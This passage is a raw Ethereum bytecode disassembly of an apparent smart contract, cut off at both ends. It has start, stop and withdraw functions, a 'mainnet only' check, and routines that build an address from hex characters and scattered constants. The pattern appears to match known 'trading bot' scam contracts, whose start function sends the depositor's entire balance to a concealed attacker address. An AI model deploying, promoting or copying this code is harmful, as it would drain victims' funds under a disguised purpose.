PUSH1 0x37 DUP4 PUSH3 0x606 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP3 POP PUSH3 0x666 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x64D JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x665 JUMPI PUSH1 0x30 DUP4 PUSH3 0x662 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x6A6 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x6C3 JUMPI PUSH1 0x57 DUP3 PUSH3 0x6BB SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP2 POP PUSH3 0x778 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x702 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x71F JUMPI PUSH1 0x37 DUP3 PUSH3 0x717 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP2 POP PUSH3 0x777 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x75E JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x776 JUMPI PUSH1 0x30 DUP3 PUSH3 0x773 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH3 0x788 SWAP2 SWAP1 PUSH3 0xFFA JUMP JUMPDEST PUSH3 0x794 SWAP2 SWAP1 PUSH3 0x1108 JUMP JUMPDEST DUP5 PUSH3 0x7A1 SWAP2 SWAP1 PUSH3 0x1108 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH3 0x7B2 SWAP2 SWAP1 PUSH3 0x107E JUMP JUMPDEST SWAP1 POP PUSH3 0x4DA JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xFD7E4D80 PUSH1 0xE0 SHL SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4EAD2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x2DCC7 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCA7BB SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xC2916 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH3 0x83B JUMPI DUP2 DUP1 PUSH3 0x821 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH3 0x833 SWAP2 SWAP1 PUSH3 0x11D3 JUMP JUMPDEST SWAP1 POP PUSH3 0x80B JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x85A JUMPI PUSH3 0x859 PUSH3 0x120B JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH3 0x88D JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x943 JUMPI PUSH1 0x10 DUP7 PUSH3 0x8AB SWAP2 SWAP1 PUSH3 0x123A JUMP JUMPDEST SWAP3 POP PUSH3 0x8BE DUP4 PUSH3 0xC98 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH3 0x8CF SWAP2 SWAP1 PUSH3 0x1272 JUMP JUMPDEST PUSH3 0x8DB SWAP2 SWAP1 PUSH3 0x1272 JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH3 0x8EF JUMPI PUSH3 0x8EE PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH3 0x92D SWAP2 SWAP1 PUSH3 0x11D3 JUMP JUMPDEST SWAP6 POP DUP1 PUSH3 0x93B SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP1 POP PUSH3 0x893 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 SUB PUSH3 0x9AC JUMPI PUSH1 0x0 PUSH3 0x99C PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST PUSH1 0x3 DUP2 SUB PUSH3 0xA0E JUMPI PUSH1 0x0 PUSH3 0x9FE PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST PUSH1 0x2 DUP2 SUB PUSH3 0xA70 JUMPI PUSH1 0x0 PUSH3 0xA60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST PUSH1 0x1 DUP2 SUB PUSH3 0xAD2 JUMPI PUSH1 0x0 PUSH3 0xAC2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP2 MLOAD DUP4 MLOAD PUSH3 0xAFD SWAP2 SWAP1 PUSH3 0x107E JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0xB19 JUMPI PUSH3 0xB18 PUSH3 0x120B JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH3 0xB4C JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH3 0xBF0 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH3 0xB7C JUMPI PUSH3 0xB7B PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH3 0xB95 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH3 0xBAB JUMPI PUSH3 0xBAA PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH3 0xBE7 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP3 POP POP PUSH3 0xB5C JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH3 0xC89 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH3 0xC15 JUMPI PUSH3 0xC14 PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH3 0xC2E SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH3 0xC44 JUMPI PUSH3 0xC43 PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH3 0xC80 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP3 POP POP PUSH3 0xBF5 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH3 0xCB3 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0xCF5 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH3 0xCEA SWAP2 SWAP1 PUSH3 0x12BA JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH3 0xD63 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH3 0xD0E JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0xD5E JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH3 0xD47 SWAP2 SWAP1 PUSH3 0x12BA JUMP JUMPDEST PUSH3 0xD53 SWAP2 SWAP1 PUSH3 0x12F6 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH3 0xD63 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C79206D61696E6E657420697320737570706F727465642E204F6E6C7920 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6D61696E6E657420697320737570706F727465642E204F6E6C79206D61696E6E PUSH1 0x20 DUP3 ADD MSTORE PUSH32 0x657420697320737570706F727465642E00000000000000000000000000000000 PUSH1 0x40 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xDFD PUSH1 0x50 DUP4 PUSH3 0xD68 JUMP JUMPDEST SWAP2 POP PUSH3 0xE0A DUP3 PUSH3 0xD79 JUMP JUMPDEST PUSH1 0x60 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH3 0xE30 DUP2 PUSH3 0xDEE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xE64 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0xE76 DUP2 PUSH3 0xE57 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x4 DUP2 LT PUSH3 0xEBF JUMPI PUSH3 0xEBE PUSH3 0xE7C JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP PUSH3 0xED2 DUP3 PUSH3 0xEAB JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xEE4 DUP3 PUSH3 0xEC2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0xEF6 DUP2 PUSH3 0xED7 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0xF13 PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0xE6B JUMP JUMPDEST PUSH3 0xF22 PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0xE6B JUMP JUMPDEST PUSH3 0xF31 PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0xEEB JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xF6F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xF52 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xF88 DUP3 PUSH3 0xF39 JUMP JUMPDEST PUSH3 0xF94 DUP2 DUP6 PUSH3 0xF44 JUMP JUMPDEST SWAP4 POP PUSH3 0xFA6 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH3 0xF4F JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xFC0 DUP3 DUP5 PUSH3 0xF7B JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x1007 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP PUSH3 0x1014 DUP4 PUSH3 0xE37 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0x1024 DUP2 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0x103E JUMPI PUSH3 0x103D PUSH3 0xFCB JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x108B DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x1098 DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH3 0x10B3 JUMPI PUSH3 0x10B2 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x10C6 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP PUSH3 0x10D3 DUP4 PUSH3 0xE37 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x1102 JUMPI PUSH3 0x1101 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1115 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP PUSH3 0x1122 DUP4 PUSH3 0xE37 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x1151 JUMPI PUSH3 0x1150 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1164 DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH3 0x1199 JUMPI PUSH3 0x1198 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x11E0 DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x11ED DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 PUSH3 0x1200 JUMPI PUSH3 0x11FF PUSH3 0x11A4 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x1247 DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x1254 DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 PUSH3 0x1267 JUMPI PUSH3 0x1266 PUSH3 0x11A4 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x127F DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x128C DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH3 0x12A7 JUMPI PUSH3 0x12A6 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x12C7 DUP3 PUSH3 0x12AD JUMP JUMPDEST SWAP2 POP PUSH3 0x12D4 DUP4 PUSH3 0x12AD JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH3 0x12F0 JUMPI PUSH3 0x12EF PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1303 DUP3 PUSH3 0x12AD JUMP JUMPDEST SWAP2 POP PUSH3 0x1310 DUP4 PUSH3 0x12AD JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH3 0x132C JUMPI PUSH3 0x132B PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x17EB DUP1 PUSH3 0x1342 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x74 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 GT PUSH2 0x4E JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x17E JUMPI DUP1 PUSH4 0xC55DAE63 EQ PUSH2 0x188 JUMPI DUP1 PUSH4 0xD85BD526 EQ PUSH2 0x1B3 JUMPI DUP1 PUSH4 0xE086E5EC EQ PUSH2 0x1DE JUMPI PUSH2 0x119 JUMP JUMPDEST DUP1 PUSH4 0x7DA68F5 EQ PUSH2 0x11E JUMPI DUP1 PUSH4 0x217A4B70 EQ PUSH2 0x128 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x153 JUMPI PUSH2 0x119 JUMP JUMPDEST CALLDATASIZE PUSH2 0x119 JUMPI PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH2 0x117 JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x110 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x126 PUSH2 0x1E8 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x134 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x13D PUSH2 0x229 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14A SWAP2 SWAP1 PUSH2 0x10B6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x15F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x168 PUSH2 0x24F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x175 SWAP2 SWAP1 PUSH2 0x10B6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x186 PUSH2 0x275 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x194 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19D PUSH2 0x3F7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1AA SWAP2 SWAP1 PUSH2 0x10B6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C8 PUSH2 0x41B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D5 SWAP2 SWAP1 PUSH2 0x10EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E6 PUSH2 0x42E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1F2 PUSH1 0x2 PUSH2 0x5E4 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x21F SWAP1 PUSH2 0x1164 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0x27F PUSH1 0x1 PUSH2 0x5E4 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x2 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x307 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x31B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB ADDRESS DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 